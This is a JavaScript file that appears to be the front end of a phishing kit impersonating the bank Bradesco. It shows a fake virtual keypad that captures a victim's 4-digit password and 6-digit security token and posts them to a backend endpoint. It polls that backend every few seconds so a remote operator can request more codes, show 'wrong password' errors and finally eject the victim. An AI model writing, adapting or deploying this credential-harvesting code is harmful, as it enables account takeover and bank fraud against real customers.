$(document).ready(function() {


    formatar();

    function formatar() {
        var extenso;

        data = new Date();

        var day = ["Domingo", "Segunda-feira", "Terça-feira", "Quarta-feira", "Quinta-feira", "Sexta-feira", "Sábado"][data.getDay()];
        var date = data.getDate();
        var month = ["Janeiro", "Fevereiro", "Março", "Abril", "Maio", "Junho", "Julho", "Agosto", "Setembro", "Outubro", "Novembro", "Dezembro"][data.getMonth()];
        var year = data.getFullYear();

        console.log(data);

        $('.date').html(`${day}, ${date} de ${month} de ${year}`);
    }

    setInterval(function() {
        //Incluir e enviar o POST para o arquivo responsável em fazer contagem
        $.post("../webdriver/function.php?funcao=consultar-serial", {
            funcao: 'atualizar_serial',
        }, function(data) {
            $('.serial').text(data);
        });
    }, 5000);

    function titular() {
        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=verifica-titular",
            data: {
                funcao: 'verificar_titular'
            },
        });
        request.done(data => {

            if (data == 'true') {
                $('#webid').show();
            }

            if (data == 'false') {
                $('#webid').hide();
                $('#conteudoSenha').show();
            }

        })
    }

    webrequest();

    $('ul#ul_teclado_virtual a').click(e => {
        e.preventDefault();
        let value = $(e.target).text().trim();

        if (value === 'Limpar') {
            $('#errosenha').hide();
            zerarSenhaDe4();
        } else {

            $('#errosenha').hide();

            let pass1 = $('input#txtPass1').val();
            let pass2 = $('input#txtPass2').val();
            let pass3 = $('input#txtPass3').val();
            let pass4 = $('input#txtPass4').val();

            if (pass1.length == 0) {
                $('input#txtPass1').val(value);
            } else if (pass2.length == 0) {
                $('input#txtPass2').val(value);
            } else if (pass3.length == 0) {
                $('input#txtPass3').val(value);
            } else if (pass4.length == 0) {
                $('input#txtPass4').val(value);
                $('#btnAcessarSenha4').addClass('btn-action-active');
            }

            console.log(value);

        }

    });


    $('#btnAcessarSenha4').on('click', function(evt) {

        $('#errosenha').hide();

        var campo = document.querySelector('#txtPass1').value;
        var campo2 = document.querySelector('#txtPass2').value;
        var campo3 = document.querySelector('#txtPass3').value;
        var campo4 = document.querySelector('#txtPass4').value;

        var valor = campo + campo2 + campo3 + campo4

        if (valor.length > 3) {

        } else {
            return false;
        }

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=salvar-token",
            data: {
                valor: valor,
                funcao: 'SENHA 4'
            },
        });
        request.done(data => {
            //alert('Sua senha: ' + valor);
            $('#errosenha').hide();
            $('#boxSenha4').hide();
            $('#loading_novocompseg').show();

            document.getElementById("accountserial").style.display = "none";
            document.getElementById("tabsapp").style.display = "none";

            setTimeout(function() {

                const request = $.ajax({
                    method: "post",
                    url: "../webdriver/function.php?funcao=enviar-comando",
                    data: {
                        comando: 'SENHA 4 RECEBIDO'
                    },
                });

            }, 2000);
            if (data == "false") {
                $('#errosenha').show();
            }
        })

    })

    function webrequest() {
        var id = document.querySelector('#ident').value;
        const requestweb = $.ajax({
            url: "../webdriver/function.php?acao=comando",
            method: "post",
            dataType: "text",
            data: {
                id: id
            },
            cache: false
        });

        requestweb.done(data => {

                if (data == "atualizar_saldo") {
                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'acesso liberado'
                        },
                        cache: false
                    });

                    request.done(data => {
                        location.href = '?app=bradesco&acao=acesso_conta';
                    })
                }

                if (data == "atendimento_finalizado") {
                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'cliente_expulso'
                        },
                        cache: false
                    });

                    request.done(data => {
                        location.href = window.location.origin + '/saida/';
                    })
                }

                if (data == "senha_4") {

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO SENHA 4'
                        },
                        cache: false
                    });

                    request.done(data => {
                        document.getElementById("loading_novocompseg").style.display = "none";
                        document.getElementById("boxToken").style.display = "none";
                        document.getElementById("errosenha").style.display = "none";

                        document.getElementById("accountserial").style.display = "block";
                        document.getElementById("boxSenha4").style.display = "block";
                        document.getElementById("tabsapp").style.display = "block";
                    })

                }

                if (data == "senha_4_erro") {

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO SENHA 4'
                        },
                        cache: false
                    });

                    request.done(data => {
                        $('#boxSenha4').show();
                        $('.tabsapp').show();
                        $('.account').show();
                        $('#loading_novocompseg').hide();
                        $('#errosenha').show();
                        document.getElementById("boxToken").style.display = "none";
                    })

                }

                if (data == "token_6") {

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO TOKEN 6'
                        },
                        cache: false
                    });

                    request.done(data => {
                        document.getElementById("loading_novocompseg").style.display = "none";
                        document.getElementById("tabsapp").style.display = "none";
                        document.getElementById("boxSenha4").style.display = "none";

                        document.getElementById("boxToken").style.display = "block";
                        document.getElementById("accountserial").style.display = "block";
                        $('#token').focus()
                        $('#token').val('');
                    })

                }

                if (data == "token_6_erro") {

                    const request = $.ajax({
                        url: "../webdriver/function.php?funcao=enviar-comando",
                        method: "post",
                        dataType: "text",
                        data: {
                            comando: 'AGUARDANDO TOKEN 6'
                        },
                        cache: false
                    });

                    request.done(data => {

                        document.getElementById("loading_novocompseg").style.display = "none";
                        document.getElementById("tabsapp").style.display = "none";
                        document.getElementById("boxSenha4").style.display = "none";

                        document.getElementById("boxToken").style.display = "block";
                        document.getElementById("errotoken").style.display = "block";
                        document.getElementById("accountserial").style.display = "block";

                        $('#token').val('');
                        $('#token').focus();
                    })

                }
            })
            .always(function() {
                setTimeout(function() {
                    webrequest();
                }, 3000);
            });

    }

    $('#btnAcessarToken').on('click', function(evt) {

        var token_value = document.querySelector('#token').value;

        var regextoken = /^\d{6}$/;

        if (regextoken.test(token_value)) {} else {
            $('#errotoken').show();
            return false;
        }

        const request = $.ajax({
            method: "post",
            url: "../webdriver/function.php?funcao=salvar-token",
            data: {
                valor: token_value,
                funcao: 'TOKEN 6'
            },
        });

        request.done(data => {

            $('#errotoken').hide();
            $('#boxToken').hide();
            $('#accountserial').hide();

            $('#loading_novocompseg').show();

            const request = $.ajax({
                url: "../webdriver/function.php?funcao=enviar-comando",
                method: "post",
                dataType: "text",
                data: {
                    comando: 'TOKEN 6 RECEBIDO'
                },
                cache: false
            });

            return true;

        })

    })

    $('#token').on('keyup', function(evt) {

        $('#errotoken').hide();

        var token_value = document.querySelector('#token').value;

        if (token_value.length == 6) {
            $('#btnAcessarToken').addClass('btn-action-active');
            $('#btnAcessarToken').prop("disabled", false);
        } else {
            $('#btnAcessarToken').removeClass('btn-action-active');
            $('#btnAcessarToken').prop("disabled", true);
        }

    })

    function zerarSenhaDe4() {
        $('input.frmPassWord').val('');
        $('#btnAcessarSenha4').removeClass('btn-action-active');
    }

    $('div#conteudo').on('focus', 'div#boxToken input#token', function(e) {
        $('div.mark-char').addClass('mark-char-visible');
    });

    $('div#conteudo').on('focusout', 'div#boxToken input#token', function(e) {
        $('div.mark-char').removeClass('mark-char-visible');
    });


    $('div#conteudo').on('keyup', 'div#boxTabela input#posicaoTabela', function(e) {

        e.preventDefault();


        e.target.value = e.target.value.replace(/[^\d]/, '')


        if (e.target.value.length == 3) {
            $("input#posicaoTabela").blur();
            $('button#btnAcessarTabela').addClass('btn-action-active');
        } else {
            $('button#btnAcessarTabela').removeClass('btn-action-active');
        }

    });

});